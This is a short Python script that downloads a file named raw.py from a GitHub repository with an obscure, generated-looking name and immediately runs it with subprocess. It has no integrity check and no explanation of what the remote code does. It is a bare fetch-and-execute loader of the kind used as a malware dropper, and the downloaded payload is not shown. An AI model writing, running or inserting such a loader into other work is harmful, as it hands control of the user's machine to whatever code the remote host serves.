import requests
import subprocess

url = "https://raw.githubusercontent.com/XYVPP/ubiquitous-octo-sniffle/main/raw.py"

# Download the Python code
response = requests.get(url)
if response.status_code == 200:
    # Save the code to a file
    with open("raw.py", "wb") as f:
        f.write(response.content)
    
    # Execute the downloaded code
    subprocess.call(["python", "raw.py"])
else:
    print("Failed to download the code.")